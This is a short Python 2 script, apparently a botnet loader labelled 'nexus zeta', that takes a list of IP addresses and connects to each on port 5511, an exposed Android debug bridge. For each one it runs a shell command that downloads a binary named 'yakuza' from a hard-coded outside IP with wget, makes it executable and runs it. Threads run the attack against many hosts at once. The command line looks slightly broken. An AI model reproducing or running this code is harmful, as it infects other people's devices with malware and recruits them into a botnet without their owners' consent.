import sys
import threading
import requests
import os
import socket
import time
from Queue import *
from threading import Thread
#nexus zeta
if len(sys.argv) < 3:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list] [output file]")

ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
 
info = open(str(sys.argv[1]),'a+')
output_file = sys.argv[2]
 
def rtek(ip):
    ip = str(ip).rstrip("\n")
    try:
        adb = socket.socket()
        adb.settimeout(5)
        adb.connect((ip,5511))
        os.system(":5511 shell \"cd /data/local/tmp/; wget http://199.38.243.9/yakuza; chmod 777 *; .yakuza; android\"")
        adb.close()
    except Exception:
        print "OFFLINE:\033[31m %s\033[37m"%(ip)
        adb.close()
        pass
 

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=rtek, args=(input,))
            thread.start()
            time.sleep(0.1)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
    thread.join()
    return


if __name__ == "__main__":
    main()